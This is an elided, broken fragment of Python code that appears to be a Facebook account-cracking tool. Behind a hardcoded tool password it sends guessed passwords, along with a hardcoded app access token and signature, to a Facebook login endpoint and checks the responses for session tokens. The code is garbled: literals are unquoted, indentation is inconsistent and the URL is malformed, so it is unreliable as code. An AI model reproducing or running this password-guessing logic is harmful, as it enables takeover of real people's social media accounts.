...
while (loop == 'true'):
    ...
    if (username == SADA):
    	password = ("\033[1;96m \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ")
        if (password == SEKANDAR DADX):
...
def login():
	...
	try:
		...
		tik()
		try:
			br.open(https://youtube.com/channel/UCGO_w4p_EhAWSnYmdo1IiHA)
										...
										if 'www.facebook.com' in q["error_msg"]:
											...
											if 'access_token' in q:
												...
												if 'www.facebook.com' in q["error_msg"]:
													...
													data = urllib.urlopen("https://www.facebook.com/profile.php?id=100055697511016/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
